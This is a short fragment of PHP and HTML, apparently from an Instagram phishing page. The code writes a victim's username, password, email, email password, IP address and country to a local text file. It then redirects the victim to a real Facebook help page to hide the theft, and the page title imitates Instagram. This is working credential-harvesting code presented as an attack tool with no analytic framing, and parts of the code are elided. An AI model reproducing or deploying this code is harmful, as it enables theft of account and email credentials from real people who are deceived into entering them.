...
$url = 'https://www.facebook.com/help/instagram/126382350847838' . $nick;
...
$file = fopen('masonfdnahmet.txt', 'a');
fwrite($file, "index: ".$nick."\n" ."Password: ".$password. "\n"."Mail: ".$mail."\n"."Mail Password: ".$mailpass."\n"."Ip Adress: " .$ip."\n".

"Country: ".$ulke ."\n".   "Time: " .$cur_time.  "\n\n\n");
fclose($file);
echo '';
    header("Location: https://www.facebook.com/help/instagram/126382350847838");
}
...
<head>
     <meta charset="utf-8">
	 <title> Instagram @ |<?php echo $nick; ?></title>
